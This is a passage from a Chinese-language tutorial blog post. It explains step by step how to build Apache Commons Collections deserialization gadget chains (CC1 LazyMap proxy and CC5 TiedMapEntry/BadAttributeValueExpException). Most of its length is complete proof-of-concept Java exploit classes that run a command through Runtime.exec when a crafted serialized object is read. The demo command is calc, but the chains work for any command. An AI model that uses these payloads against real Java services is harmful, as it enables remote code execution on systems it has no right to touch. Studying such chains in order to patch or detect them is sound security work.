<h4 id="Payload构造"><a href="#Payload构造" class="headerlink" title="Payload构造"></a>Payload构造</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazyMapExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//返回Runtime Class</span></span><br><span class="line">                <span class="comment">//获取getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//call getRuntime方法得到Runtime实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="type">String</span> <span class="variable">classToSerialize</span> <span class="operator">=</span> <span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> Constructor&lt;?&gt; constructor = Class.forName(classToSerialize).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">secondInvocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, lazyMap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Map</span> <span class="variable">testMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">evilMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(</span><br><span class="line">                testMap.getClass().getClassLoader(),</span><br><span class="line">                testMap.getClass().getInterfaces(),</span><br><span class="line">                secondInvocationHandler</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">final</span> Constructor&lt;?&gt; ctor = Class.forName(classToSerialize).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) ctor.newInstance(Override.class, evilMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;lz.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(handler);<span class="comment">//序列化badAttributeValueExpException</span></span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 服务端反序列化读取，并触发漏洞</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;lz.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        objectInputStream.readObject();<span class="comment">//只需要readObject()就会触发漏洞</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="LazyMap版本-POC构造过程（CommonsCollections-5）"><a href="#LazyMap版本-POC构造过程（CommonsCollections-5）" class="headerlink" title="LazyMap版本 - POC构造过程（CommonsCollections 5）"></a>LazyMap版本 - POC构造过程（CommonsCollections 5）</h3><h4 id="Intro-2"><a href="#Intro-2" class="headerlink" title="Intro"></a>Intro</h4><hr>
<p><span id="cc5">3/12/2021 补充：</span></p>
<p>之前学习的时候看的资料太杂，学到cc5的时候发现这个LazyMap版本其实是cc5的，CC1的LazyMap版本其实是用到了<strong>代理</strong>方面的知识。</p>
<hr>
<p>我们的利用链需要用到如下的Class</p>
<ul>
<li>InvokerTransformer</li>
<li>ChainedTrasnformer</li>
<li>ConstantTransformer</li>
<li>LazyMap</li>
<li>BadAttributeValueExpException</li>
</ul>
<h4 id="第一步到第三步："><a href="#第一步到第三步：" class="headerlink" title="第一步到第三步："></a>第一步到第三步：</h4><p>和之前的TransformedMap版本低前三步是一样的。</p>
<h4 id="第四步：LazyMap-get"><a href="#第四步：LazyMap-get" class="headerlink" title="第四步：LazyMap - get()"></a>第四步：LazyMap - get()</h4><p>同<code>TransformedMap</code>一样，我们需要寻找可以执行<code>chainedTransformer</code>的<code>transform()</code>方法的利用链。</p>
<p>在<code>LazyMap</code>中，我们发现了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);<span class="comment">//重点</span></span><br><span class="line">        <span class="built_in">super</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这段代码中，<code>this.factory.transform(key)</code>就执行了<code>transform()</code>方法，如果我们能让<code>factory</code>被赋值为我们构造好的<code>chainedTransformer</code>，就可以触发漏洞了。</p>
<p>我们发现LazyMap有两个构造函数，其中一个构造函数会传入以<code>Transformer</code>类型的参数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.factory = factory;<span class="comment">//我们可以控制factory</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们尝试构造POC时new一个新的LazyMap，并将我们的链传进去，发现无法被构造。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210805215256433.png" alt="image-20210805215256433"></p>
<p>该构造方法是<strong>protected</strong>修饰的，意味着我们不能直接访问。</p>
<p>在<code>LazyMap</code>中，还有一个我们熟悉的<code>decorate()</code>方法，该方法会返回我们想要的instance</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210805215440540.png" alt="image-20210805215440540"></p>
<p>于是，现在的<strong>POC</strong>可以构造如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazyMapExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//返回Runtime Class</span></span><br><span class="line">                <span class="comment">//获取getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//call getRuntime方法得到Runtime实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,chainedTransformer);<span class="comment">//return a new lazyMap</span></span><br><span class="line">        lazyMap.get(<span class="string">&quot;hello&quot;</span>);<span class="comment">//触发漏洞</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>计算器成功弹出</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210805215558587.png" alt="image-20210805215558587"></p>
<p>现在，我们尝试模拟远程服务器与客户端之间的序列化和反序列化流程。</p>
<p><strong>POC</strong>:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazyMapExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//返回Runtime Class</span></span><br><span class="line">                <span class="comment">//获取getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//call getRuntime方法得到Runtime实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,chainedTransformer);<span class="comment">//return a new lazyMap</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line"></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;lz.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(lazyMap);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 服务端反序列化读取，并触发漏洞</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;lz.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">target</span> <span class="operator">=</span> (Map) objectInputStream.readObject();</span><br><span class="line">        target.get(<span class="string">&quot;hello&quot;</span>);<span class="comment">//触发漏洞</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功！我们现在看看，服务端触发漏洞的话，需要什么条件： 将反序列化后的object强制转化为Map类，然后再调用get()方法 - 看上去依然有点麻烦，我们有什么办法能让它更容易被触发呢？</p>
<h4 id="第五步：TiedMapEntry-getValue"><a href="#第五步：TiedMapEntry-getValue" class="headerlink" title="第五步：TiedMapEntry.getValue()"></a>第五步：TiedMapEntry.getValue()</h4><p>安全研究前辈们并未发现有可控且调用<code>get()</code>方法的<code>readObject()</code>方法，但在<code>TiedMapEntry</code>类中，<code>getValue()</code>方法调用了get()方法，<code>map</code>变量是可控的。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210806093126421.png" alt="image-20210806093126421"></p>
<h4 id="第六步：TiedMapEntry-toString"><a href="#第六步：TiedMapEntry-toString" class="headerlink" title="第六步：TiedMapEntry.toString()"></a>第六步：TiedMapEntry.toString()</h4><p>我们继续找有没有调用<code>getValue()</code>的方法，就在<code>TiedMapEntry</code>类中，我们发现了<code>toString()</code>，其中会调用到<code>getValue()</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.getKey() + <span class="string">&quot;=&quot;</span> + <span class="built_in">this</span>.getValue();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这样一来我们的利用链便是 - <code>调用toString()会触发 -&gt; getValue() -&gt;get()</code>。那是否能像<code>TransformedMap</code>版本的POC一样，能够找到一个可控的<code>readObject()</code>直接调用<code>toString()</code>呢？</p>
<h4 id="第七步：BadAttributeValueExpException"><a href="#第七步：BadAttributeValueExpException" class="headerlink" title="第七步：BadAttributeValueExpException"></a>第七步：BadAttributeValueExpException</h4><p>在<code>BadAttributeValueExpException</code>类中，我们发现了<code>readObject()</code>方法，其调用了<code>toString()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">    <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);<span class="comment">//valObj是从fields中得到val的值</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">        val = <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        val= valObj;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">        val = valObj.toString();<span class="comment">//此处调用了toString()</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">        val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果我们能够控制<code>valObj</code>为<code>TiedMapEntry</code>类的<code>object</code>，就能够触发漏洞。这里的<code>valObj</code>是从反序列化后的<code>object</code>的<code>fields</code>中直接得到的，那么我们可以直接创建一个值为<code>TiedMapEntry</code>类<code>object</code>的<code>val</code>field。</p>
<p>我们先看看<code>constructor</code>能不能直接赋值：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">BadAttributeValueExpException</span> <span class="params">(Object val)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.val = val == <span class="literal">null</span> ? <span class="literal">null</span> : val.toString();</span><br><span class="line">    <span class="comment">//如果val为null，则this.val=null</span></span><br><span class="line">    <span class="comment">//如果val不为null,则this.val = val.toString()</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>constructor</code>中，如果我们直接通过构造方法传入<code>TiedMapEntry</code>类，会在客户端创建<code>object</code>的时候就执行<code>toString()</code>触发方法并把结果赋值给<code>val</code>，而服务器在调用<code>readObject()</code>的时候获取到的<code>val</code>为<strong>toString()方法的返回值</strong>，从而不会触发漏洞。</p>
<p>于是我们不能通过<code>constructor</code>传入<code>TiedMapEntry</code>类的<code>object</code>，相反，我们设置它为<code>null</code>。我们尝试能否手动设置val的值：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210806095753374.png" alt="image-20210806095753374"></p>
<p>发现并不能访问到<code>val</code>值，val值是<code>private</code>属性,<img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210806095846949.png" alt="image-20210806095846949"></p>
<p>在<code>BadAttributeValueExpException</code>类中也没有<code>setter</code>能够帮助我们去设置。那么我们可以使用反射对其赋值。</p>
<h4 id="最终POC-1"><a href="#最终POC-1" class="headerlink" title="最终POC"></a>最终POC</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazyMapExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//返回Runtime Class</span></span><br><span class="line">                <span class="comment">//获取getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//call getRuntime方法得到Runtime实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,chainedTransformer);<span class="comment">//return a new lazyMap</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;leihehe&quot;</span>);<span class="comment">//绑定给TiedMapEntry，如果TiedMapEntry的toString()被执行，lazyMap会被执行get()</span></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);<span class="comment">//该类中的readObject()可控，可执行TiedMapEntry的toString()</span></span><br><span class="line">        <span class="comment">//创建一个badAttributeValueExpException实例，这将作为我们的最终的恶意object被序列化</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> badAttributeValueExpException.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);<span class="comment">//得到val这个variable</span></span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);<span class="comment">//因为是private，所以需要设置accessible为true</span></span><br><span class="line">        val.set(badAttributeValueExpException,tiedMapEntry);<span class="comment">//修改val的值为tiedMapEntry</span></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;lz.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(badAttributeValueExpException);<span class="comment">//序列化badAttributeValueExpException</span></span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 服务端反序列化读取，并触发漏洞</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;lz.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        objectInputStream.readObject();<span class="comment">//只需要readObject()就会触发漏洞</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="http://wjlshare.com/archives/1498#Transformer">Java反序列化-CommonCollections</a></p>
